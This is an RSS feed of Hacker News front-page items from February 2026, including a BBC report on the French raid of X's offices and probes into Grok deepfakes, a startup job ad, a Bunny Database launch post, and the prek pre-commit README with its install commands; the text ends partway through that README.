<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 04 Feb 2026 07:59:51 +0000</lastBuildDate><item><title>X offices raided in France as UK opens fresh investigation into Grok</title><link>https://www.bbc.com/news/articles/ce3ex92557jo</link><description>&lt;doc fingerprint="69068b1187c7e8c4"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;X offices raided in France as UK opens fresh investigation into Grok&lt;/head&gt;
    &lt;p&gt;The French offices of Elon Musk's X have been raided by the Paris prosecutor's cyber-crime unit, as part of an investigation into suspected offences including unlawful data extraction and complicity in the possession of child pornography.&lt;/p&gt;
    &lt;p&gt;The prosecutor's office also said both Musk and former X chief executive Linda Yaccarino had been summoned to appear at hearings in April.&lt;/p&gt;
    &lt;p&gt;In a separate development, the UK's Information Commissioner's Office (ICO) announced a probe into Musk's AI tool, Grok, over its "potential to produce harmful sexualised image and video content."&lt;/p&gt;
    &lt;p&gt;Writing on X, Musk said the raid was a "political attack".&lt;/p&gt;
    &lt;p&gt;The company said in a statement that it was "disappointed" but "not surprised," and accused the Paris Public Prosecutor's office of an "abusive act."&lt;/p&gt;
    &lt;p&gt;X also denied any wrongdoing and said the raid "endangers free speech."&lt;/p&gt;
    &lt;p&gt;The investigation began in January 2025 when French prosecutors started looking into content recommended by X's algorithm, before being widened in July that year to include Musk's controversial AI chatbot, Grok.&lt;/p&gt;
    &lt;p&gt;Yaccarino also took to X to accuse French prosecutors of carrying out "a political vendetta against Americans."&lt;/p&gt;
    &lt;p&gt;"To be clear: they are lying," added Yaccarino, who left the firm last year.&lt;/p&gt;
    &lt;p&gt;Following Tuesday's raid, French prosecutors say they are now investigating whether X has broken the law across multiple areas.&lt;/p&gt;
    &lt;p&gt;Among potential crimes it said it would investigate were complicity in possession or organised distribution of images of children of a pornographic nature, infringement of people's image rights with sexual deepfakes and fraudulent data extraction by an organised group.&lt;/p&gt;
    &lt;head rend="h2"&gt;New UK investigation&lt;/head&gt;
    &lt;p&gt;Meanwhile, UK authorities have given an update on their investigations into sexual deepfakes created by Grok and shared on X.&lt;/p&gt;
    &lt;p&gt;The images - often made using real images of women without their consent - prompted a barrage of criticism in January from victims, online safety campaigners and politicians.&lt;/p&gt;
    &lt;p&gt;The company eventually intervened to prevent the practice, after Ofcom and others launched investigations.&lt;/p&gt;
    &lt;p&gt;In an update on Tuesday, Ofcom said it was continuing to investigate the platform and was treating it as "a matter of urgency".&lt;/p&gt;
    &lt;p&gt;But it added it was currently unable to investigate the creation of illegal images by Grok in this case because it did not have sufficient powers relating to chatbots.&lt;/p&gt;
    &lt;p&gt;However, shortly afterwards the ICO said it was launching its own probe, in conjunction with Ofcom, into the processing of personal data in relation to the Grok.&lt;/p&gt;
    &lt;p&gt;"The reports about Grok raise deeply troubling questions about how people's personal data has been used to generate intimate or sexualised images without their knowledge or consent, and whether the necessary safeguards were put in place to prevent this," said William Malcolm, the ICO's executive director for regulatory risk &amp;amp; innovation.&lt;/p&gt;
    &lt;p&gt;In late January, the European Commission announced an investigation into its parent company xAI over concerns about the images.&lt;/p&gt;
    &lt;p&gt;A Commission spokesperson said it was in touch with France over its search of X's office in Paris.&lt;/p&gt;
    &lt;head rend="h2"&gt;'Not a free country'&lt;/head&gt;
    &lt;p&gt;Pavel Durov - founder of the messaging app Telegram - criticised the French authorities on Tuesday, accusing France of being "the only country in the world that is criminally persecuting all social networks that give people some degree of freedom".&lt;/p&gt;
    &lt;p&gt;"Don't be mistaken: this is not a free country," he added in a post on X.&lt;/p&gt;
    &lt;p&gt;Durov was arrested and detained in France in August 2024 over alleged moderation lapses on his messaging app, which the Paris prosecutor's office said had failed to curb criminal activity.&lt;/p&gt;
    &lt;p&gt;He was permitted to leave the country last March after the platform made some changes to the way it operates following the arrest.&lt;/p&gt;
    &lt;p&gt;These included sharing some user data with authorities in response to legal requests.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46868998</guid><pubDate>Tue, 03 Feb 2026 10:08:52 +0000</pubDate></item><item><title>Emerge Career (YC S22) is hiring a product designer</title><link>https://www.ycombinator.com/companies/emerge-career/jobs/omqT34S-founding-product-designer</link><description>&lt;doc fingerprint="3d88781899c444b5"&gt;
  &lt;main&gt;
    &lt;p&gt;All-in-one re-entry &amp;amp; workforce development training platform&lt;/p&gt;
    &lt;p&gt;Emerge Career’s mission is to break the cycle of poverty and incarceration. We’re not just building software; we’re creating pathways to real second chances. Through an all-in-one platform deeply embedded within the criminal justice system, we recruit, train, and place justice-impacted individuals into life-changing careers.&lt;/p&gt;
    &lt;p&gt;Our vision is to become the country’s unified workforce development system, replacing disconnected brick-and-mortar job centers with one integrated, tech-powered solution that meets low-income individuals exactly where they are. Today, the federal government spends billions annually on education and training programs, yet only about 70% of participants graduate, just 38.6% secure training-related employment, and average first-year earnings hover around $34,708.&lt;/p&gt;
    &lt;p&gt;By contrast, our seven-person team has already outperformed the job centers in two entire states (Vermont and South Dakota) in just the past year. With an 89% graduation rate and 92% of graduates securing training-related employment, our alumni aren’t just getting jobs—they’re launching new lives with average first-year earnings of $77,352. The results speak for themselves, and we’re just getting started.&lt;/p&gt;
    &lt;p&gt;Before Emerge, our founders Zo and Gabe co-founded Ameelio, an award-winning tech nonprofit that is dismantling the prison communication duopoly. Backed by tech luminaries like Reid Hoffman, Vinod Khosla, and Jack Dorsey, and by major criminal-justice philanthropies such as Arnold Ventures and the Mellon Foundation, Ameelio became a recognized leader in the space. Because of this experience both Zo and Gabe understood what it took to create change from within the system. After serving over 1M people impacted by incarceration, they witnessed firsthand the gap in second-chance opportunities and the chronic unemployment plaguing those impacted by the justice system. Emerge Career is committed to solving this issue.&lt;/p&gt;
    &lt;p&gt;Our students are at the heart of our work. Their journeys have captured national attention on CBS, NBC, and in The Boston Globe, and our programs now serve entire states and cities. And we’re not doing it alone: our vision has attracted support from Alexis Ohanian (776), Michael Seibel, Y Combinator, the Opportunity Fund, and public figures like Diana Taurasi, Deandre Ayton, and Marshawn Lynch. All of us believe that, with the right mix of technology and hands-on practice, we can redefine workforce development and deliver true second chances at scale.&lt;/p&gt;
    &lt;p&gt;Emerge Career was designed to tackle two systemic issues: recidivism, fueled by post-incarceration unemployment and poverty, and labor shortages in key industries. Over 60% of formerly incarcerated people remain unemployed a year after incarceration, seeking work but not finding it. The reality is shocking, workforce development programs are severely limited inside prison, with only one-third of incarcerated people ever participating. To worsen, the available prison jobs offer meager wages, often less than $1 per hour, and often do not equip individuals with the skills for long-term stable employment.&lt;/p&gt;
    &lt;p&gt;We call this a Founding Design Engineer role, even three years in and with multiple contracts under our belt, for two reasons. First, you'll be our very first engineer, joining our co-founder, who's built the entire platform solo to date. Second, our growth is now outpacing our systems, and we can't keep up on maintenance alone. We're at a critical juncture: we can either hire someone to simply care for what exists, or we can bring on a talent who believes that, with the right blend of technology and hands-on practice, we can unify the workforce-development system and deliver second chances at true scale. We hope that can be you.&lt;/p&gt;
    &lt;p&gt;This is not a traditional engineering job. You'll build features in React and TypeScript, but your real job is helping students finish. That means understanding the human problem first: why do people disengage? What makes someone choose to keep going when the payoff is months away? You'll answer those questions through direct conversations, usability research, and watching how people actually use what you build. Then you'll prototype fast, ship real software, and measure whether it worked. Some days that looks like code. Other days it looks like a phone call, a support ticket, or a whiteboard session figuring out how to turn a one-off fix into a system that scales.&lt;/p&gt;
    &lt;p&gt;This role blends engineering, product, design, and program operations. We're looking for someone who believes good design can inspire a person to invest in their own future, and who wants to prove it, week after week, by shipping work that measurably helps students succeed. If you want to be close to users, own outcomes end to end, and build something that actually matters, you'll thrive here.&lt;/p&gt;
    &lt;p&gt;You design by building. You don't hand off mockups and wait. You open Cursor, Claude Code, or whatever gets you closest to a real, testable thing fastest. You might already be shipping code in production — or you're itching to. You believe the fastest path to a great design is putting something real in front of a real user and watching what happens.&lt;/p&gt;
    &lt;p&gt;You are relentlessly scrappy. You prototype in hours, not weeks. You'd rather test an ugly thing that teaches you something than polish a beautiful thing nobody's used yet. You know that at this stage, speed of learning is the only thing that matters. Fidelity comes later. Signal comes first.&lt;/p&gt;
    &lt;p&gt;You refuse to be blocked. When engineering bandwidth isn't there, you don't sit around. You figure it out — a Figma prototype, a coded prototype, a quick hack in the codebase. You treat "waiting for a developer" as a personal failure. You find a way or you make one.&lt;/p&gt;
    &lt;p&gt;You think in outcomes, not outputs. You don't measure your work in screens delivered. You measure it in whether students finished, whether they came back, whether the thing you shipped actually moved a number that matters. You're obsessed with the gap between what you designed and what actually happened.&lt;/p&gt;
    &lt;p&gt;You talk to users constantly. Not in scheduled quarterly research sprints — in real conversations, every week. You build relationships with students. You know their names, their blockers, their moments of doubt. Your best design ideas come from a 10-minute phone call, not a brainstorm.&lt;/p&gt;
    &lt;p&gt;You have strong taste but low ego. You have opinions about what good looks like and you'll fight for them. But when the data says you're wrong, you move on fast. You don't fall in love with your work. You fall in love with the problem.&lt;/p&gt;
    &lt;p&gt;You believe everyone deserves a second chance. You treat everyone with dignity. You know how to meet people exactly where they are — with empathy and compassion — helping create a space where everyone feels seen and valued, regardless of their background.&lt;/p&gt;
    &lt;p&gt;You work hard. You show up early, stay late, and do what needs to get done — no ego, no excuses. This isn't a 9-to-5. The team puts in 10+ hour days because we care about the mission and each other. If that sounds miserable, this isn't for you. If it sounds exciting, you'll fit right in.&lt;/p&gt;
    &lt;p&gt;Talking to students — a lot. Your week starts and ends with users. You'll build real relationships with students, not just run usability sessions. You'll understand why someone almost quit, what message made them log back in, what screen confused them at 11pm. These conversations are your primary design tool.&lt;/p&gt;
    &lt;p&gt;Prototyping at the speed of conversation. You hear a problem on a call Tuesday. By Wednesday you have something testable — a coded prototype, a functional hack, a Figma flow wired to real data. By Thursday a student is using it. By Friday you know if it worked. That's the cycle. Repeat.&lt;/p&gt;
    &lt;p&gt;Shipping real product, not just designs. You'll work in our React and TypeScript codebase — or use AI tools like Cursor and Claude Code to get there. The goal isn't to become a full-time engineer. The goal is to never let "it hasn't been built yet" slow down learning. Some of what you build will go straight to production. Some will be throwaway prototypes. You'll know the difference.&lt;/p&gt;
    &lt;p&gt;Designing the moments that keep students going. The hardest design problem here isn't layout or typography. It's commitment. Students are betting months of effort on a future they have to imagine. You'll study where they disengage, what triggers doubt, and what reignites momentum. Then you'll design the moments — an interface, a message, a milestone — that help someone choose to keep going. How do you make a better life in three months feel worth the sacrifice today? You'll own that problem.&lt;/p&gt;
    &lt;p&gt;Measuring what matters. Polished decks don't matter here. You'll define success metrics for what you ship, track whether completion rates moved, whether more students hit the next milestone, whether the intervention you designed actually intervened. You'll close the loop between design and outcome every time.&lt;/p&gt;
    &lt;p&gt;Working across the entire stack of the student experience. Some days that looks like interface design. Other days it looks like rethinking a Customer.io campaign, redesigning an onboarding flow, or sitting with the ops team to understand why students in one facility disengage faster than another. You go where the problem is.&lt;/p&gt;
    &lt;p&gt;Documenting your work clearly. Our work spans months and involves multiple teams. You'll create visibility when a change impacts operations and help others understand how features affect training and service delivery. Precision matters.&lt;/p&gt;
    &lt;p&gt;Start Date: ASAP&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46869901</guid><pubDate>Tue, 03 Feb 2026 12:00:23 +0000</pubDate></item><item><title>Bunny Database</title><link>https://bunny.net/blog/meet-bunny-database-the-sql-service-that-just-works/</link><description>&lt;doc fingerprint="a71f183a5d20d688"&gt;
  &lt;main&gt;
    &lt;p&gt;Donât want to babysit your app database on a VM but not willing to pay the DBaaS tax either? We're building a third way.&lt;/p&gt;
    &lt;p&gt;Today, weâre launching Bunny Database as a public preview: a SQLite-compatible managed service that spins down when idle, keeps latency low wherever your users are, and doesnât cost a fortune.&lt;/p&gt;
    &lt;head rend="h2"&gt;So whatâs the deal with database services in 2026?&lt;/head&gt;
    &lt;p&gt;Itâs become clear by now that the DBaaS platforms that garnered the love of so many devs are all going upmarket. Removing or dumbing down free tiers, charging for unused capacity, charging extra for small features, or bundling them in higher tiers â you already know the drill.&lt;/p&gt;
    &lt;p&gt;Hard to blame anyone for growing their business, but it doesnât feel right when these services stop making sense for the very people who helped popularize them in the first place.&lt;/p&gt;
    &lt;p&gt;So where does that leave you?&lt;/p&gt;
    &lt;head rend="h2"&gt;Like SQLite, but for the web&lt;/head&gt;
    &lt;p&gt;Not every project needs Postgres, and thatâs okay. Sometimes you just want a simple, reliable database that you can spin up quickly and build on, without worrying itâll hit your wallet like an EC2.&lt;/p&gt;
    &lt;p&gt;Thatâs what we built Bunny Database for.&lt;/p&gt;
    &lt;p&gt;What you get:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;One-click deployment: just name your database and go, no config needed&lt;/item&gt;
      &lt;item&gt;Language-specific tooling: SDKs for TS/JS, Go, Rust, and .NET help you handle the boring bits&lt;/item&gt;
      &lt;item&gt;Low latency anywhere: replication regions let you serve reads close to your users&lt;/item&gt;
      &lt;item&gt;41 regions worldwide: choose between automatic, single-region, and multi-region deployment&lt;/item&gt;
      &lt;item&gt;Works over HTTP: wire up anything youâd like&lt;/item&gt;
      &lt;item&gt;Database editor: insert data or run queries on the spot&lt;/item&gt;
      &lt;item&gt;Metrics: instant visibility into reads, writes, storage, and latency&lt;/item&gt;
      &lt;item&gt;Affordable, pay-as-you-go pricing: only pay for what you use, but without the serverless tax&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Get the full tour including how to connect Bunny Database to your app in this quick demo from our DX Engineer, Jamie Barton:&lt;/p&gt;
    &lt;head rend="h2"&gt;Why care about database latency anyway?&lt;/head&gt;
    &lt;p&gt;You probably optimize the heck out of your frontend, APIs, and caching layers, all for the sake of delivering an experience that feels instant to your users. But when your database is far away from them, round-trip time starts to add noticeable latency.&lt;/p&gt;
    &lt;p&gt;The usual fix is to introduce more caching layers, denormalized reads, or other workarounds. Thatâs obviously no fun.&lt;/p&gt;
    &lt;p&gt;And when you think about it, devs end up doing this because the popular DBaaS platforms are usually either limited, complex, or too costly when it comes to multi-region deployments. So what looks like a caching problem is actually a data locality issue.&lt;/p&gt;
    &lt;p&gt;OK, but how bad can it really be?&lt;/p&gt;
    &lt;p&gt;To find out, we ran a read latency benchmark and measured p95 latency in Bunny Database.&lt;/p&gt;
    &lt;p&gt;We picked a number of regions across the world and compared round-trip time for client locations ever farther away from the database in:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;a single-region setup,&lt;/item&gt;
      &lt;item&gt;with replication regions enabled.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Turns out serving reads close to clients reduced latency by up to 99%.&lt;/p&gt;
    &lt;p&gt;Check out the full write-up on the benchmark setup and results here.&lt;/p&gt;
    &lt;p&gt;While this definitely matters most to apps with global users, data locality does apply to everyone. With Bunny Database, you donât have to stick to major data center locations and compensate with caching workarounds any more. Instead, you get a lot of flexibility to set up regions in an intuitive interface and itâs easy to switch things up as your requirements change.&lt;/p&gt;
    &lt;p&gt;Choose between 3 deployment types when creating a database:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Automatic region selection gives you one-click deployment with minimal latency. Bunny Database will select regions for you based on your IP address (you can check and tweak the selection in settings later).&lt;/item&gt;
      &lt;item&gt;Single-region deployment lets you pick one of 41 regions available worldwide (check the full list here).&lt;/item&gt;
      &lt;item&gt;Manual region selection gives you custom multi-region setup, where you can freely pick regions that make the most sense for your audience.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All of this lets you start wherever youâd like and add regions as needed, without re-architecting your app.&lt;/p&gt;
    &lt;head rend="h2"&gt;Usage-based pricing, but without the serverless tax&lt;/head&gt;
    &lt;p&gt;In the database world, capacity-based pricing gives you some predictability. But no one likes to pay for unused capacity, right?&lt;/p&gt;
    &lt;p&gt;Serverless, on the other hand, is supposed to be cost-efficient, yet can rack up bills quickly, especially when the DBaaS charges significant markups on top of already pricey compute.&lt;/p&gt;
    &lt;p&gt;We donât do hyperscalers, though, so we can charge a fair price for Bunny Database in a usage-based model.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Reads: $0.30 per billion rows&lt;/item&gt;
      &lt;item&gt;Writes: $0.30 per million rows&lt;/item&gt;
      &lt;item&gt;Storage: $0.10 per GB per active region (monthly)&lt;/item&gt;
      &lt;item&gt;When not getting requests, Bunny Database only incurs storage costs. One primary region is charged continuously, while read replicas only add storage costs when serving traffic (metered by the hour)&lt;/item&gt;
      &lt;item&gt;Your usage is charged continuously (pay-as-you-go) and invoiced monthly&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;During the public preview phase, Bunny Database is free.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait, what does âSQLite-compatibleâ actually mean?&lt;/head&gt;
    &lt;p&gt;Bunny Database wouldnât be possible without libSQL, the open-source, open-contribution fork of SQLite created by Turso.&lt;/p&gt;
    &lt;p&gt;We run Bunny Database on our own fork of libSQL, which gives us the freedom to integrate it tightly with the bunny.net platform and handle the infrastructure and orchestration needed to run it as a managed, multi-region service.&lt;/p&gt;
    &lt;p&gt;What does this mean for Bunny Databaseâs upstream feature parity with libSQL and SQLite, respectively?&lt;/p&gt;
    &lt;p&gt;The short answer is that we donât currently promise automatic or complete feature parity with either upstream libSQL or the latest SQLite releases.&lt;/p&gt;
    &lt;p&gt;While libSQL aims to stay compatible with SQLiteâs API and file format, it doesnât move in lockstep with upstream SQLite. We wouldnât expect otherwise, especially as Turso has shifted focus from libSQL toward a long-term rewrite of SQLite in Rust.&lt;/p&gt;
    &lt;p&gt;For Bunny Database, this means that compatibility today is defined by the libSQL version weâre built on, rather than by chasing every upstream SQLite or libSQL change as it lands. We havenât pulled in any upstream changes yet, and we donât currently treat upstream parity as an automatic goal.&lt;/p&gt;
    &lt;p&gt;Thatâs intentional. Our focus so far has been on making Bunny Database reliable and easy to operate as a service. We think bringing in upstream changes only makes sense when they clearly improve real-world use cases, not just to tick a parity checkbox.&lt;/p&gt;
    &lt;p&gt;If there are specific libSQL features youâd like to see exposed in Bunny Database, or recent SQLite features youâd want us to pull in, weâd love to hear about it. Join our Discord to discuss your use cases and help shape the roadmap!&lt;/p&gt;
    &lt;head rend="h2"&gt;Whatâs ahead for Bunny Database&lt;/head&gt;
    &lt;p&gt;Speaking of the roadmap, we donât stop cooking. Hereâs whatâs coming up next:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Automatic backups&lt;/item&gt;
      &lt;item&gt;Database file import/export&lt;/item&gt;
      &lt;item&gt;Auto-generated, schema-aware API with type-safe SDKs&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thereâs even more to come, but itâs too soon to spill the beans yet, especially while weâre in public preview. Weâd love to hear your feedback, so we can shape what ships next together.&lt;/p&gt;
    &lt;head rend="h2"&gt;More tools to build with&lt;/head&gt;
    &lt;p&gt;Bunny Database works standalone and fits right into your stack via the SDKs (or you can hook up anything using the HTTP API). But it also plays nicely with Bunny Edge Scripting and Bunny Magic Containers.&lt;/p&gt;
    &lt;p&gt;To connect your database to an Edge Script or a Magic Containers app, simply go to the Access tab of the chosen database and click Generate Tokens to create new access credentials for it.&lt;/p&gt;
    &lt;p&gt;Once theyâre generated, youâll get two paths to choose from:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Click Add Secrets to an Edge Script and select the one youâd like to connect from the list. Youâll also need to import the libSQL TypeScript client and use the provided code snippet to connect it to your database.&lt;/item&gt;
      &lt;item&gt;Click Add Secrets to Magic Container App and select the one youâd like to connect from the list. Youâll also need to connect to the database from your app using one of the client libraries or the HTTP API.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;After you complete the setup, the database URL and access token will be available as environment variables in your script or app. Use them to connect to your database:&lt;/p&gt;
    &lt;code&gt;import&lt;/code&gt;
    &lt;code&gt;{&lt;/code&gt;
    &lt;code&gt;createClient&lt;/code&gt;
    &lt;code&gt;}&lt;/code&gt;
    &lt;code&gt;from&lt;/code&gt;
    &lt;code&gt;"@libsql/client/web"&lt;/code&gt;
    &lt;code&gt;;&lt;/code&gt;
    &lt;code&gt;const&lt;/code&gt;
    &lt;code&gt;client&lt;/code&gt;
    &lt;code&gt;=&lt;/code&gt;
    &lt;code&gt;createClient&lt;/code&gt;
    &lt;code&gt;({&lt;/code&gt;
    &lt;code&gt;url&lt;/code&gt;
    &lt;code&gt;:&lt;/code&gt;
    &lt;code&gt;process.env.&lt;/code&gt;
    &lt;code&gt;DB_URL&lt;/code&gt;
    &lt;code&gt;,&lt;/code&gt;
    &lt;code&gt;authToken&lt;/code&gt;
    &lt;code&gt;:&lt;/code&gt;
    &lt;code&gt;process.env.&lt;/code&gt;
    &lt;code&gt;DB_TOKEN&lt;/code&gt;
    &lt;code&gt;});&lt;/code&gt;
    &lt;code&gt;const&lt;/code&gt;
    &lt;code&gt;result&lt;/code&gt;
    &lt;code&gt;=&lt;/code&gt;
    &lt;code&gt;client&lt;/code&gt;
    &lt;code&gt;.&lt;/code&gt;
    &lt;code&gt;execute&lt;/code&gt;
    &lt;code&gt;(&lt;/code&gt;
    &lt;code&gt;"SELECT * FROM users"&lt;/code&gt;
    &lt;code&gt;);&lt;/code&gt;
    &lt;p&gt;You can find more detailed, step-by-step integration instructions in the docs:&lt;/p&gt;
    &lt;head rend="h2"&gt;Hop on board&lt;/head&gt;
    &lt;p&gt;We canât wait to see what youâll build with Bunny Database and what you think of it. During the public preview phase, you get 50 databases per user account, each capped at 1 GB, but we hope this should be more than enough for lots of fun projects.&lt;/p&gt;
    &lt;p&gt;Just sign in to the bunny.net dashboard to get started. Happy building!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46870015</guid><pubDate>Tue, 03 Feb 2026 12:13:44 +0000</pubDate></item><item><title>Agent Skills</title><link>https://agentskills.io/home</link><description>&lt;doc fingerprint="8f77afff0b4fb448"&gt;
  &lt;main&gt;&lt;head rend="h2"&gt;Why Agent Skills?&lt;/head&gt;Agents are increasingly capable, but often don’t have the context they need to do real work reliably. Skills solve this by giving agents access to procedural knowledge and company-, team-, and user-specific context they can load on demand. Agents with access to a set of skills can extend their capabilities based on the task they’re working on. For skill authors: Build capabilities once and deploy them across multiple agent products. For compatible agents: Support for skills lets end users give agents new capabilities out of the box. For teams and enterprises: Capture organizational knowledge in portable, version-controlled packages.&lt;head rend="h2"&gt;What can Agent Skills enable?&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;Domain expertise: Package specialized knowledge into reusable instructions, from legal review processes to data analysis pipelines.&lt;/item&gt;&lt;item&gt;New capabilities: Give agents new capabilities (e.g. creating presentations, building MCP servers, analyzing datasets).&lt;/item&gt;&lt;item&gt;Repeatable workflows: Turn multi-step tasks into consistent and auditable workflows.&lt;/item&gt;&lt;item&gt;Interoperability: Reuse the same skill across different skills-compatible agent products.&lt;/item&gt;&lt;/list&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46871173</guid><pubDate>Tue, 03 Feb 2026 14:09:54 +0000</pubDate></item><item><title>New York’s budget bill would require “blocking technology” on all 3D printers</title><link>https://blog.adafruit.com/2026/02/03/new-york-wants-to-ctrlaltdelete-your-3d-printer/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872540</guid><pubDate>Tue, 03 Feb 2026 15:51:42 +0000</pubDate></item><item><title>Qwen3-Coder-Next</title><link>https://qwen.ai/blog?id=qwen3-coder-next</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46872706</guid><pubDate>Tue, 03 Feb 2026 16:01:50 +0000</pubDate></item><item><title>Prek: A better, faster, drop-in pre-commit replacement, engineered in Rust</title><link>https://github.com/j178/prek</link><description>&lt;doc fingerprint="28df57ddde9b6d0"&gt;
  &lt;main&gt;
    &lt;p&gt;pre-commit is a framework to run hooks written in many languages, and it manages the language toolchain and dependencies for running the hooks.&lt;/p&gt;
    &lt;p&gt;prek is a reimagined version of pre-commit, built in Rust. It is designed to be a faster, dependency-free and drop-in alternative for it, while also providing some additional long-requested features.&lt;/p&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;Although prek is pretty new, it’s already powering real‑world projects like CPython, Apache Airflow, FastAPI, and more projects are picking it up—see Who is using prek?. If you’re looking for an alternative to &lt;code&gt;pre-commit&lt;/code&gt;, please give it a try—we’d love your feedback!&lt;/p&gt;
    &lt;p&gt;Please note that some languages are not yet supported for full drop‑in parity with &lt;code&gt;pre-commit&lt;/code&gt;. See Language Support for current status.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🚀 A single binary with no dependencies, does not require Python or any other runtime.&lt;/item&gt;
      &lt;item&gt;⚡ Faster than &lt;code&gt;pre-commit&lt;/code&gt;and more efficient in disk space usage.&lt;/item&gt;
      &lt;item&gt;🔄 Fully compatible with the original pre-commit configurations and hooks.&lt;/item&gt;
      &lt;item&gt;🏗️ Built-in support for monorepos (i.e. workspace mode).&lt;/item&gt;
      &lt;item&gt;🐍 Integration with &lt;code&gt;uv&lt;/code&gt;for managing Python virtual environments and dependencies.&lt;/item&gt;
      &lt;item&gt;🛠️ Improved toolchain installations for Python, Node.js, Bun, Go, Rust and Ruby, shared between hooks.&lt;/item&gt;
      &lt;item&gt;📦 Built-in Rust-native implementation of some common hooks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head&gt;Standalone installer&lt;/head&gt;
    &lt;p&gt;prek provides a standalone installer script to download and install the tool,&lt;/p&gt;
    &lt;p&gt;On Linux and macOS:&lt;/p&gt;
    &lt;code&gt;curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.sh | sh&lt;/code&gt;
    &lt;p&gt;On Windows:&lt;/p&gt;
    &lt;code&gt;powershell -ExecutionPolicy ByPass -c "irm https://github.com/j178/prek/releases/download/v0.3.1/prek-installer.ps1 | iex"&lt;/code&gt;
    &lt;head&gt;PyPI&lt;/head&gt;
    &lt;p&gt;prek is published as Python binary wheel to PyPI, you can install it using &lt;code&gt;pip&lt;/code&gt;, &lt;code&gt;uv&lt;/code&gt; (recommended), or &lt;code&gt;pipx&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# Using uv (recommended)
uv tool install prek

# Using uvx (install and run in one command)
uvx prek

# Adding prek to the project dev-dependencies
uv add --dev prek

# Using pip
pip install prek

# Using pipx
pipx install prek&lt;/code&gt;
    &lt;head&gt;Homebrew&lt;/head&gt;
    &lt;code&gt;brew install prek&lt;/code&gt;
    &lt;head&gt;Cargo&lt;/head&gt;
    &lt;p&gt;Build from source using Cargo (Rust 1.89+ is required):&lt;/p&gt;
    &lt;code&gt;cargo install --locked prek&lt;/code&gt;
    &lt;head&gt;npmjs&lt;/head&gt;
    &lt;p&gt;prek is published as a Node.js package and can be installed with any npm-compatible package manager:&lt;/p&gt;
    &lt;code&gt;# As a dev dependency
npm add -D @j178/prek
pnpm add -D @j178/prek
bun add -D @j178/prek

# Or install globally
npm install -g @j178/prek
pnpm add -g @j178/prek
bun install -g @j178/prek

# Or run directly without installing
npx @j178/prek --version
bunx @j178/prek --version&lt;/code&gt;
    &lt;head&gt;Nix&lt;/head&gt;
    &lt;p&gt;prek is available via Nixpkgs.&lt;/p&gt;
    &lt;code&gt;# Choose what's appropriate for your use case.
# One-off in a shell:
nix-shell -p prek

# NixOS or non-NixOS without flakes:
nix-env -iA nixos.prek

# Non-NixOS with flakes:
nix profile install nixpkgs#prek&lt;/code&gt;
    &lt;head&gt;GitHub Releases&lt;/head&gt;
    &lt;p&gt;Pre-built binaries are available for download from the GitHub releases page.&lt;/p&gt;
    &lt;head&gt;GitHub Actions&lt;/head&gt;
    &lt;p&gt;prek can be used in GitHub Actions via the j178/prek-action repository.&lt;/p&gt;
    &lt;p&gt;Example workflow:&lt;/p&gt;
    &lt;code&gt;name: Prek checks
on: [push, pull_request]

jobs:
  prek:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: j178/prek-action@v1&lt;/code&gt;
    &lt;p&gt;This action installs prek and runs &lt;code&gt;prek run --all-files&lt;/code&gt; on your repository.&lt;/p&gt;
    &lt;p&gt;prek is also available via &lt;code&gt;taiki-e/install-action&lt;/code&gt; for installing various tools.&lt;/p&gt;
    &lt;p&gt;If installed via the standalone installer, prek can update itself to the latest version:&lt;/p&gt;
    &lt;code&gt;prek self update&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I already use pre-commit: follow the short migration checklist in the quickstart guide to swap in &lt;code&gt;prek&lt;/code&gt;safely.&lt;/item&gt;
      &lt;item&gt;I'm new to pre-commit-style tools: learn the basics—creating a config, running hooks, and installing git hooks—in the beginner quickstart walkthrough.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;It is multiple times faster than &lt;code&gt;pre-commit&lt;/code&gt;and takes up half the disk space.&lt;/item&gt;
